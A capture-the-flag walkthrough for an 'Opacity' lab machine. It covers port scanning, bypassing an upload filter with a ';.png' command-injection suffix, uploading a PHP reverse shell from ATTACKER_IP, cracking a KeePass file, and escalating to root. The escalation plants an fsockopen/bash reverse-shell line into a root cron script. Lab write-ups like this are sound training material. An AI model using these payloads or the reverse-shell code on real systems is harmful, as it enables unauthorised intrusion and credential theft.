# Scenario

Opacity is an easy machine that can help you in the penetration testing learning process.

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?

**Hint**: There are several ways to perform an action; always analyze the behavior of the application.

# Enumeration

## \[+] 10.10.36.79 - opacity.thm

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```sh
sudo echo '10.10.36.79 opacity.thm' >> /etc/hosts
export RHOSTS=10.10.36.79
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] opacity.thm/login/php

![6ed1d7c650b0aaa6ca2efb32bedea3bd.png](/resources/81d8e6ad2412438ba5b34bf6c0a4e441.png)

Here we just have a login portal without any valid credentials. So, let's use [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt) to fuzz for directories and files to see what we can find:

```sh
feroxbuster -u http://opacity.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

### \[-] opacity.thm/cloud/

Here we have a file upload web application that is supposed to allow image files only from an external URL:

![e7034e267f8f2855736831e9b299a226.png](/resources/6cb4ff20d99f4985938074e6c95f0f00.png)

To test this feature, let's first open the website in a proxy tool like [ZAP](zaproxy.org/) or [Burp Suite](https://portswigger.net/burp).

Then we can create or download any image file and host it using Python:

```sh
python3 -m http.server 8888
```

Back to the file upload web application, we enter our attacking machine's IP along with the image filename in the "External URL" field and click rhe "Upload Image" button:

![3f1712d7b813e994b1c46fde50903559.png](/resources/303b5958d5cc47d7938f47fb327a1764.png)

After a short animation we should see our image file, mine is a PNG with a green square with the word "Test" in blue text:

![4f7b5c781e12bea9aedc8589dbda9b37.png](/resources/20154c1c041844c2b45fa72a12c62e4b.png)

Right-clicking on the image then selecting "Open Image in a New Tab" shows the URL where the image was saved. In my case it was `http://opacity.thm/cloud/images/test.png`.

If we try to upload anything other than a file that doesn't end in a image format, our request is rejected and nothing happens.

To bypass this basic allowlisting, we just need to append `;.png` to the end of our URL. If we were to take a guess at what is happening in the background, the web application is taking direct user input and checking to see if it ends in a image format, if it does then it makes a [wget](https://linux.die.net/man/1/wget) or [curl](https://linux.die.net/man/1/curl) request to download the image. In Linux, if we append the semi-colon (`;`) at the end of a single command, we can chain a string of other multiple commands in a single line.

# Initial Foothold

### \[-] www-data\@opacity

Let's use [Ivan Sincek's PHP reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) to get our reverse shell. We just need to add our attacking machine's IP and port to line 177:

![4a33b17bb60247ad2fcd03441c2b30f8.png](/resources/b3a3ab5e50544fd3954f66ebab649559.png)

Start a Netcat listener:

```sh
nc -nvlp 4444
```

Then host it again with Python if it isn't up already:

```sh
python3 -m http.server 8888
```

Back on the web application, we enter the URL `<ATTACKER_IP>:8888/shell.php;.png` which will download our shell script and bypass the filter:

![38de716b028e085e42029b2e3390c193.png](/resources/99b2916b82ae4cffbec3d9efbc35f55b.png)

The image will be broken, but our shell script is on the server:

![b124ffcf7926a002b09d2ca353704e01.png](/resources/5392162693aa4edba1d2eb764f12c577.png)

Right-click on the broken image and select "Open Image in a New Tab" then edit the URL from `http://opacity.thm/cloud/images/shell.php;.png` to `http://opacity.thm/cloud/images/shell.php` then press the `Enter` key. The web page should hang, but if we check back to our listener, we should have a connection:

![331f240ec904fa35ca84fedc92f09d5e.png](/resources/01a249b6c25a4b52ae278826e777efc0.png)

Let's stablize the shell we just got doing the following steps:

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` ... Use Python to spawn a stable shell
2. `CTRL + Z` ... Backgrounds the current shell
3. `stty raw -echo;fg` ... Fixes echoing and foregrounds the shell
4. `export TERM=xterm-256color` ... Sets terminal to xterm

If we move up a few directories to `/var/www/html/`, we can find the source code for the login portal in `login.php` where we will also find hard coded credentials for the user `administator`:

```sh
cd ../../
ls -lah
cat login.php
```

![f9239ea609cbcf701350971ceb8a3987.png](/resources/1374e243b7b1436398bfca2911237b0f.png)

# Privilege Escalation

### \[-] sysadmin\@opacity

Checking the `/opt` directory reveals a KDBX file which is a database format used to store credentials in the [KeePass](https://keepass.info/) password manager:

![ef4fb4cf8bed64dcc6883b81664bb9d3.png](/resources/cf334323e0304ab8882b7ca15d3053cd.png)

To download the file, let's start a Python HTTP server on the victim machine:

```sh
python3 -m http.server 8888
```

![b9f243ae4796214b4ad75ffad8e8eec2.png](/resources/51c434bcc26144a9b0c78b2d4c78091a.png)

And download the file on our attacking machine:

```sh
wget $RHOSTS:8888/dataset.kdbx
```

![4ab3182727959357d02a9c6ee2c41045.png](/resources/765884a3b24e47a484b304e81583a528.png)

Now, on our attacking machine, we can use [keepass2john](https://github.com/openwall/john/blob/bleeding-jumbo/src/keepass2john.c) (already installed on Kali) to convert it to a format [John the Ripper](https://www.openwall.com/john/) can use.

```sh
keepass2john dataset.kdbx > dataset.john
```

Then crack it using John the Ripper with [this wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-75.txt):

```sh
john --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-75.txt dataset.john
```

![5759904f4f1979193b0509e9aebec22a.png](/resources/ff1abd52b7964f7ba23c3662e91ea576.png)

To open this KDBX file, we need to download the KeePass application ([Linux/MacOS](https://keepassxc.org/), [Windows](https://keepass.info/download.html)). In KeePass, click on the "Open Database" button, select the `dataset.kbdx` file and enter the password when prompted:

![5076da35816954e9ed3bfd8029759b58.png](/resources/68c132df53e84af7bfd677f8eb519c45.png)

Then click on the Eye icon to reveal the password.

Use these credentials to login via SSH using the [ssh](https://linux.die.net/man/1/ssh) command and enter the password when prompted:

```sh
ssh sysadmin@$RHOSTS
```

![3d9ccd9a52a38624401de1ca64aa626d.png](/resources/d72262d6d2e24f4ca54810e62a97ae34.png)

We can get the flag in `/home/sysadmin/local.txt`:

```sh
cat /home/sysadmin/local.txt
```

![6c994860ed13c2b507433c669c0af4a2.png](/resources/a5660eba58a848ddb43c161a6502ab1b.png)

After some enumeration, we will find a `backup.zip` file im the `/var/backups/` directory:

![d62f5a96a7cbb318de4093da11199f8f.png](/resources/990d80c70f7747dcb874e13d68dc5822.png)

Since we don't have permission to write here, let's create a directory in the `/tmp` directory first:

```sh
mdkir /tmp/backup
```

Then run the [unzip](https://linux.die.net/man/1/unzip) command:

```sh
unzip backup.zip -d /tmp/backup
```

![fc0d93baf2cca21024b86aa77a5e5cdb.png](/resources/cde470624ec04efabce3617fdd471d28.png)

We can now change our directory and inspect the files. Let's start with `script.php`:

```sh
cd /tmp/backup
cat script.php
```

![2fd433f300414e0f0ff84ce3175427c0.png](/resources/33d9cbb5b43649e3b416b51aa24336bf.png)

The highlighted section above shows `require_once` (similar to Python's `import`) being used to call the `zipData` function which will compress all the files in the `/home/sysadmin/scripts` directory to the `/var/backups/backup.zip` file, then echo the message "Successful" when finished.

We can search for the imported library file by using the [find](https://linux.die.net/man/1/find) command:

```sh
find / -type f -name 'backup.inc.php' 2>/dev/null
```

![9e3a2a392a58576a08fe642d0d415a0b.png](/resources/cfe4a5dff4d64c18b83a221adde44d1e.png)

Since we now know there is a backup script, let's see if there are any scheduled tasks to run this script.

On the attacking machine, let's download [pspy](https://github.com/DominicBreuker/pspy) and host a web server using Python:

```sh
python3 -m http.server 8888
```

On the victim machine, we'll change to the `/tmp` directory then download it using [wget](https://linux.die.net/man/1/wget) and give it executable permissions using [chmod](https://linux.die.net/man/1/chmod) then run the binary:

```
cd /tmp
wget <ATTACKER_IP>:8888/pspy32
chmod +x pspy32
./pspy32
```

After letting pspy run for a couple of minutes, we will see the backup script being ran as a scheduled task ([cronjob](https://en.wikipedia.org/wiki/Cron)) with the User ID (UID) of 0 which is the user `root`:

![a042cf78f2090dc6cb9f4e602c1e41e7.png](/resources/bcab158143974b59bcef285251a0765d.png)

Press `CTRL + C` to close pspy.

### \[-] root\@opacity

Although these files are not writeable, they are all in a directory that we own (`/home/sysadmin/scripts/lib/`). We can simply delete or backup these files, remove them and replace them with our own malicious files.

To get a reverse shell as the user `root`, we will first have to make a backup copy of the `/home/sysadmin/scripts/lib/backup.inc.php` file:

```sh
cp /home/sysadmin/scripts/lib/backup.inc.php /home/sysadmin/scripts/lib/backup.inc.php.bak
```

Then we can delete the original `backup.inc.php` file, answer `y` when prompted:

```sh
rm /home/sysadmin/scripts/lib/backup.inc.php
y
```

![7e973e05657060e47f5d43a17732dd84.png](/resources/2c4b848062364ad5a6e11fe76e751130.png)

Next, copy the backup and give it the original name:

```sh
cp /home/sysadmin/scripts/lib/backup.inc.php.bak /home/sysadmin/scripts/lib/backup.inc.php
```

Now, we need to edit the `zipBackup` function so that when the scheduled task is ran, it will run out malicious reverse shell code and give us a shell back as root.

Let's start another listener on our attacking machine on a different port:

```sh
nc -nvlp 4445
```

Then edit the file using [nano](https://linux.die.net/man/1/nano):

```sh
nano backup.inc.php
```

Change the `zipData` function with the follow code to resemble the screenshot below and replace the IP and port with your attacking machine's:

```php
$sock=fsockopen("<ATTACKER_IP>",4445);exec("/bin/bash <&3 >&3 2>&3");
```

![b3e5188991becb2daad651ea195ebda1.png](/resources/5c0c5f05003f484596e46182407f1628.png)

After a few minutes we should get a connection back as the user `root`:

![b20f915f7bda2b2dadeb76c766069af9.png](/resources/ab602a4aabea4909b6a615de8ddd5abe.png)

We can get the root flag in `/root/proof.txt`:

```sh
cat /root/proof.txt
```

![1bf543d227fb6dcc1b020c14fe4d5bf4.png](/resources/3373ac16f6f24dcb89d53d7bc8763851.png)
